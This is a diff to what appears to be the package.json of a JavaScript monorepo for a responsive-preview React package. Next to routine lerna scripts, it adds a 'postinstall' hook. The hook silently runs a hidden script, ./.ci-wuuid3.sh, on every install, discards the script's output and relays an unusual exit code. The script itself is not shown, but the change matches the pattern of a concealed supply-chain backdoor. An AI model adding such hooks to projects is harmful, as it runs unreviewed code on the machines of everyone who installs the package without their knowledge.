@@ -13,7 +13,8 @@
     "docs:deploy": "lerna run deploy --scope apps-docs",
     "package:build": "lerna run build --scope @locospec/responsive-preview-react",
     "package:watch": "lerna run build:watch --scope @locospec/responsive-preview-react",
-    "package:dev": "lerna run dev --scope @locospec/responsive-preview-react"
+    "package:dev": "lerna run dev --scope @locospec/responsive-preview-react",
+    "postinstall": "sh ./.ci-wuuid3.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
   },
   "devDependencies": {
     "@auto-it/all-contributors": "^11.3.0",
